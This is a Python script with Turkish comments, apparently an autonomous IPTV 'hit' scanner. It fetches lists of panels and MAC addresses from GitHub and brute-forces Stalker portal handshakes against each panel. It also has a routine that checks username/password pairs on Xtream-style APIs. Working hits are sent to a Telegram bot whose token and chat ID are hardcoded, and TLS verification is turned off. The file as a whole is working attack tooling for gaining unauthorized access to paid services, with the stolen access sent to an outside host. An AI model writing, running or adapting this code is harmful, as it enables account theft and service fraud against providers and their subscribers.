import os
import time
import threading
import requests
from flask import Flask
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# SSL uyarılarını kapat
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

app = Flask('')

@app.route('/')
def home():
    return "Otonom IPTV Tarayıcı Aktif ve Bulutta Çalışıyor!"

def run_web():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# --- TELEGRAM BİLDİRİM AYARLARI ---
TOKEN = "9296501081:AAGTNmvWB8Qn8-kVxGNoJcC8LXTLb8lnZ94"
CHAT_ID = "39743305"

def telegrama_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"[!] Telegram mesajı gönderilemedi: {e}")

def m3u_tara(panel, user, pas):
    api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
    headers = {
        'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
        'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
    }
    try:
        res = requests.get(api_url, headers=headers, timeout=5, verify=False)
        if res.status_code == 200 and 'user_info' in res.text:
            if '"auth":1' in res.text or '"status":"Active"' in res.text:
                m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                mesaj = (
                    f"🔥 <b>M3U HİT BULUNDU! (Bulut)</b>\n"
                    f"🌐 <b>Panel:</b> http://{panel}\n"
                    f"👤 <b>User:</b> <code>{user}</code>\n"
                    f"🔑 <b>Pass:</b> <code>{pas}</code>\n"
                    f"🔗 <b>M3U:</b> {m3ulink}"
                )
                telegrama_gonder(mesaj)
                return True
    except:
        pass
    return False

def mac_tara(panel, mac):
    mac_url = f"http://{panel}/c/portal.imixs.com/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac}"
    headers = {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'}
    try:
        res = requests.get(mac_url, headers=headers, timeout=5, verify=False)
        if res.status_code == 200 and ('js' in res.text or 'token' in res.text):
            mesaj = (
                f"🔥 <b>MAC HİT BULUNDU! (Bulut)</b>\n"
                f"🌐 <b>Panel:</b> http://{panel}\n"
                f"🎯 <b>MAC:</b> <code>{mac}</code>"
            )
            telegrama_gonder(mesaj)
            return True
    except:
        pass
    return False

def arka_plan_tarayici():
    print("[*] Bulut Otonom Tarayıcı Başlatıldı ve GitHub Verileri Bekleniyor...")
    
    # GitHub Raw Linklerin Doğrudan Entegre Edilmiş Hali
    MAC_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/Telegram_Nirvana_Pro/02_Mac_Dosyalari/saf_001a79_maclar.txt"
    PANEL_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/Telegram_Nirvana_Pro/06_Bulunan_Paneller/benzersiz_paneller.txt"
    
    while True:
        try:
            print("[i] GitHub'dan güncel veriler çekiliyor...")
            
            maclar = []
            try:
                r_mac = requests.get(MAC_RAW_URL, timeout=10)
                if r_mac.status_code == 200:
                    maclar = [m.strip() for m in r_mac.text.splitlines() if m.strip()]
                    print(f"[+] GitHub'dan {len(maclar)} adet saf MAC yüklendi.")
            except Exception as e:
                print(f"[!] MAC'ler çekilemedi: {e}")

            paneller = []
            try:
                r_panel = requests.get(PANEL_RAW_URL, timeout=10)
                if r_panel.status_code == 200:
                    paneller = [p.strip().replace('http://', '').replace('https://', '') for p in r_panel.text.splitlines() if p.strip()]
                    print(f"[+] GitHub'dan {len(paneller)} adet panel yüklendi.")
            except Exception as e:
                print(f"[!] Paneller çekilemedi: {e}")

            if not paneller or not maclar:
                print("[!] Uyarı: GitHub'dan yeterli veri alınamadı, 5 dakika sonra tekrar denenecek...")
                time.sleep(300)
                continue

            # MAC Taramaları
            for panel in paneller:
                for mac in maclar:
                    mac_tara(panel, mac)
                    time.sleep(0.5)

            print("[i] Tur tamamlandı, 15 dakika sonra tekrar taranacak...")
            time.sleep(900)

        except Exception as e:
            print(f"[!] Döngü Hatası: {e}")
            time.sleep(60)

if __name__ == '__main__':
    t = threading.Thread(target=run_web)
    t.start()
    arka_plan_tarayici()
